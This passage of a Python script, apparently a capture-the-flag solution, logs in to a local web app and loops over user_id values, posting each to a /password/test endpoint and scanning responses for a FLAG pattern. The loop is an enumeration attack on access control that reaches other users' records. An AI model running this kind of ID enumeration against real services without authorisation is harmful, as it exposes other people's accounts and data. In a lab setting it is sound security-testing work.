print(f"[+] Testing user_id values from {test_range.start} to {test_range.stop - 1}")
print(f"[+] Base URL: {base_url}")
print("=" * 60)

successful_access = []
anomalous_responses = []
flag_found = False

for user_id in test_range:
    try:
        # Use session to handle cookies
        session = requests.Session()
        
        # Initial login to establish session
        login_data = {
            "username": "test",
            "password": "test"
        }
        
        # Set the session cookie we have
        session.cookies.set("session", session_cookie, domain="127.0.0.1", path="/")
        
        # First POST to / (initial authentication)
        resp1 = session.post(f"{base_url}/", data=login_data)
        
        # Second POST to /password/test with the test user_id
        password_test_data = {
            "username": "test",
            "user_id": user_id,
            "password": "test"
        }
        
        resp2 = session.post(f"{base_url}/password/test", data=password_test_data)
        
        # Check for FLAG pattern in response
        flag_match = re.search(r'FLAG\{[^}]+\}', resp2.text)
        
        print(f"\n[TEST] user_id={user_id}")
        print(f"  Status Code: {resp2.status_code}")
        print(f"  Content Length: {len(resp2.content)} bytes")
        
        if flag_match:
            flag_found = True
            print(f"  [!] FLAG FOUND: {flag_match.group()}")
            print(f"  [!] Response: {resp2.text}")
        
        # Check for successful access indicators
        if resp2.status_code == 200:
            successful_access.append({
                "user_id": user_id,
                "status": resp2.status_code,
                "content_length": len(resp2.content),
                "response_snippet": resp2.text[:200]  # First 200 chars for analysis
            })
            print(f"  [+] Successful authentication - Response snippet: {resp2.text[:100]}...")
        elif resp2.status_code != 404 and resp2.status_code != 403:
            # Any non-standard error code is interesting
            anomalous_responses.append({
                "user_id": user_id,
                "status": resp2.status_code,
                "content_length": len(resp2.content),
                "response": resp2.text
            })
            print(f"  [-] Anomalous response: {resp2.text[:100]}...")
        else:
            print(f"  [-] Access denied (status {resp2.status_code})")
            
    except Exception as e:
        print(f"\n[!] Error testing user_id={user_id}: {str(e)}")

print("\n" + "=" * 60)
print("[SUMMARY]")
print(f"Total user_id values tested: {len(test_range)}")
print(f"Successful authentications (200): {len(successful_access)}")
print(f"Anomalous responses: {len(anomalous_responses)}")
print(f"FLAG found: {flag_found}")

if successful_access:
    print("\n[+] Successful Access Details:")
    for entry in successful_access[:5]:  # Show first 5
        print(f"  user_id={entry['user_id']} | Status: {entry['status']} | Length: {entry['content_length']}B")

if anomalous_responses:
    print("\n[-] Anomalous Response Details:")
    for entry in anomalous_responses[:5]:
        print(f"  user_id={entry['user_id']} | Status: {entry['status']} | Length: {entry['content_length']}B")

if flag_found:
    print("\n[!] FLAG IDENTIFIED - Review full output above")
else:
    print("\n[-] No FLAG found in any response")
